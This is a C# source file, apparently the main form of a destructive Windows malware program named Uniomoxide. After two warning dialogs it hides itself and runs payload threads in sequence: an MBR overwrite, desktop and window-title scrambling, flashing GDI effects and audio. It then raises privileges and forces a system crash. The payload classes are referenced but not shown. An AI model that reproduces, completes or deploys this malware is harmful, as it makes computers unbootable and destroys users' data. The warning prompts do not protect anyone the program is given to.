using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace Uniomoxide
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            if (MessageBox.Show(

                            "YOU ARE ABOUT TO RUN A MALWARE CALLED Uniomoxide.exe Trojan.\n" +
                            "\nuse this malware wisely, this will cause data loss or makes your computer likely unbootable/unusable" +
                            "\nby running this program clicking yes, then you accept the risk of the damage you cause." +
                            "\ndo not make under any circumstances using this Encrypted Software." +
                            "\ndo not try anything but the Master Boot Record or other things that do not belong to you." +
                            "\nor if you dont know what this malware does click no to make your computer safe." +
                            "\nare you sure you want to execute this malware?\n" +
                            "\nTHERE IS NO RECOVERY METHOD IF YOU RUN THIS PROGRAM." +
                            "\nWARNING: THIS COUNTAINS FLASHING LIGHTS AND LOUD NOISES.",

                            "Uniomoxide.exe - fucked up if the hsl malware stands?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) == DialogResult.Yes)
            {
                if (MessageBox.Show(

                            "THIS IS THE FINAL WARNING.\n" +
                            "\nIF YOU READ THE FINAL WARNING THEN KEEP IN MIND YOUR PC IS GOING TO BE DESTROYED." +
                            "\nClicking yes Corrupts your pc." +
                            "\nyou wont be able to use windows again!" +
                            "\nthe creator is not responsible for any data loss or damages to your computer." +
                            "\nARE YOU SURE YOU STILL WANT TO EXECUTE THIS???" +
                            "\nthis is your final chance to get rid of the program by 1% chance.",

                            "Uniomoxide.exe - FINAL WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) == DialogResult.Yes)
                {
                    this.Hide();
                    new Thread(payloads.MBR).Start();
                    Thread.Sleep(5000);
                    new Thread(payloads.Unknownerror).Start();
                    new Thread(payloads.randomize_desktop).Start();
                    new Thread(payloads.randomize_window_titles).Start();
                    Thread.Sleep(1000);
                    new Thread(Beat.player).Start();
                    new Thread(GDI.GDIBow).Start();
                    Thread.Sleep(20000);
                    new Thread(GDI2.SRCANDBlack).Start();
                    new Thread(GDI2.CUBE).Start();
                    Thread.Sleep(30000);
                    new Thread(GDI4.ROXT).Start();
                    Thread.Sleep(30000);
                    new Thread(GDI2.TRODI).Start();
                    Thread.Sleep(30000);
                    new Thread(GDI2.DrawLOLZ).Start();
                    new Thread(GDI2.InvertColor).Start();
                    Thread.Sleep(30000);
                    new Thread(GDI.GDIBow3).Start();
                    Thread.Sleep(31000);
                    new Thread(GDI2.hi).Start();
                    new Thread(GDI2.textgdi).Start();
                    Thread.Sleep(30000);
                    Class1.RaisePrivilege();
                    Class1.CauseNtHardError();
                }
                else
                {
                    this.Hide();
                    Environment.Exit(0);
                }
            }
        }
    }
}